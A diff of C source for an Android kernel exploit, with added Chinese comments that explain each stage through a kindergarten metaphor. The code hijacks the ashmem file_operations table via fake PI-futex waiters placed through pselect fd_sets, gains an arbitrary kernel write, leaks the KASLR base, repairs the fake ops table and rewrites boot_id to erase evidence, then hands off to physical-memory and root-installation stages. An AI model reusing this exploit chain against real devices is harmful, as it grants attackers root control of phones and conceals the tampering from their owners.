@@ -1,3 +1,20 @@
+/* ==========================================================================
+ * 【第 2 关】偷换玩具柜的钥匙牌 —— FOPS 劫持
+ * ==========================================================================
+ * 幼儿园每个玩具柜挂一块"谁能开柜子"的钥匙牌(文件操作 ops 表)。
+ * 我们的目标柜子 = ashmem 设备(匿名共享内存，谁都能碰)。
+ *
+ * 偷换手法(鬼标签版任意写)：
+ *   1. 假排班表里把"鬼标签的 PI 树父指针"指向钥匙牌上要涂改的那一格
+ *   2. 园长整理鬼标签时,顺手把 PI 树父指针(书包地址)写到那一格
+ *      —— 相当于把钥匙牌上的名字涂改成"书包里的假钥匙牌"
+ *   3. 以后对 ashmem 调用 llseek/ioctl/read/write，园长按图索骥
+ *      拿到的是书包里的假钥匙牌 -> 假函数指针 -> 想干嘛就干嘛
+ *
+ * 本关核心是把"鬼标签写"升级成稳定的"任意地址写 8 字节"(cfi 系列)，
+ * 再顺手修复/还原钥匙牌，别让园长发现。
+ * ========================================================================== */
+
 #include "common.h"
 
 #define PSELECT_CFI_ROUTE_ATTEMPTS 24
@@ -70,6 +87,9 @@ void open_selected_fds(
   FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
 }
 
+/* 【涂改钥匙牌的准备】fd_set 每格 8 字节，正好写下假标签的关键字段：
+ * in[0]=假标签地址(鬼标签本体) ex[0]=真园长(init_task) ex[1]=假锁...
+ * pselect 一进内核，这些格子被拷到栈上，盖住真排队标签。 */
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(in);
   FD_ZERO(out);
@@ -85,6 +105,10 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   fdset_put_word(ex, 3, 0);
 }
 
+/* 【趁交接瞬间动手】waiter 睡进 pselect(盖上假标签)后，本函数配合
+ * consumer 反复喊老师改优先级 —— 园长每走一遍 PI 链，就有机会把
+ * 书包地址写到玩具柜钥匙牌(ashmem fops)的 llseek 格上。
+ * 不同 delay 轮换 = 调整"老师喊话"和"园长走路"的时间差(撞运气窗口)。 */
 void do_pselect_fake_lock_route(void) {
   if (!page_base || !fake_lock || !fake_fops) {
     cfi_last_step = 30;
@@ -190,6 +214,9 @@ int repair_fake_fops_llseek(int fd) {
          after == llseek;
 }
 
+/* 【把假钥匙牌的格子填成真函数】书包里的假钥匙牌刚抢到手时格子内容
+ * 可能被踩过，这里逐格回填真实函数地址(read_iter/write_iter/ioctl...)，
+ * 让假牌"看起来完全正常"，园长按牌找人时直接跳到真函数。 */
 int refresh_fake_fops_text(int fd) {
   struct fops_slot {
     size_t off;
@@ -217,6 +244,10 @@ int refresh_fake_fops_text(int fd) {
   return 1;
 }
 
+/* 【第 1 关备胎: 用偷来的读牌能力反推门牌】如果 slide/perf 都没拿到
+ * 门牌号，这里用假钥匙牌的 configfs_read 读真钥匙牌(ashmem fops)上的
+ * open/ioctl/mmap 函数地址 —— 真函数地址 - 编译期偏移 = 园长门牌 _stext。
+ * 五个格子互相印证，全对上才算数。 */
 int leak_kernel_base(int fd) {
   kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
   kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
@@ -260,6 +291,8 @@ int leak_kernel_base(int fd) {
   return 1;
 }
 
+/* 【擦掉纸条上的墨痕】第 1 关在 boot_id 纸条上留了墨痕(门牌号)，
+ * 园长可能会发现纸条被改过 —— 这里用万能写把它写回原样，毁灭证据。 */
 int restore_slide_boot_id(int fd) {
   uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
   slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
@@ -280,10 +313,15 @@ int restore_slide_boot_id(int fd) {
          slide_bootid_after == slide_bootid_want;
 }
 
+/* 【接力交棒】第 2 关(钥匙牌)到手后立刻传给第 3 关(水管改造)和
+ * 第 4 关(戴徽章) —— install_pipe_physrw 在 pipe.c，install_android_root
+ * 在 root.c。 */
 int install_child_root(int fd) {
   return install_pipe_physrw(fd) && install_android_root(fd);
 }
 
+/* 【第 2 关验收】确认钥匙牌真的被偷换成功：读出玩具柜真钥匙牌上的
+ * llseek 格，看是否已变成书包里的假钥匙牌地址(脏了=偷换成功)。 */
 int try_cfi_stage(void) {
   cfi_attempts++;
   int fd = open_ashmem_device();
